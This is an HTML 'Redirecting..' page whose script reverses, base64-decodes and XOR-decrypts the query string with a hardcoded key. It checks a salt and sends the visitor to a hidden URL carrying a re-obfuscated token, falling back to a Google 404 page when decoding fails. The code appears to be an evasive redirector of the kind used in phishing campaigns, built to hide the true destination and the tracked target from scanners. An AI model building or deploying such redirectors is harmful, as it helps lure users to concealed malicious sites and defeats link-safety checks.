<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting..</title>
  <script>
    window.onload = function () {
      const xorBytes = (data, key) => {
        const keyBytes = new TextEncoder().encode(key);
        const inputBytes = data instanceof Uint8Array ? data : new TextEncoder().encode(data);
        return new Uint8Array(inputBytes.map((byte, i) =>
          byte ^ keyBytes[i % keyBytes.length]
        ));
      };

      const reverse = str => [...str].reverse().join('');
      const fallback = 'https://www.google.com/404';
      const key = "MySecretKey!";
      const salt = "SALT123";

      try {
        const query = window.location.search.slice(1);
        const reversed = decodeURIComponent(query);
        const base64 = reverse(reversed);

        // ✅ Decode Base64 to string then to bytes
        const raw = atob(base64);
        const rawBytes = new Uint8Array([...raw].map(ch => ch.charCodeAt(0)));

        // ✅ Decrypt the bytes using XOR
        const decodedBytes = xorBytes(rawBytes, key);
        const decoded = new TextDecoder().decode(decodedBytes);

        const [a, b, checkSalt] = decoded.split('|');
        if (checkSalt !== salt) throw new Error("Invalid salt");

        // ✅ Encode `b` again for x param (obfuscation)
        const reversedB = [...b].reverse().join('');
        const bXoredBytes = xorBytes(reversedB, key);
        const encodedB = btoa(String.fromCharCode(...bXoredBytes));
        const finalX = encodeURIComponent([...encodedB].reverse().join(''));
        const finalUrl = `${a}/${finalX}`;
   
        window.location.href = finalUrl;
        console.log("Final ", finalUrl);

      } catch (e) {
        console.error("Decoding failed:", e.message);
        window.location.href = fallback;
      }
    };
  </script>
</head>
<body>
  <p>Please Wait ....</p>
</body>
</html>
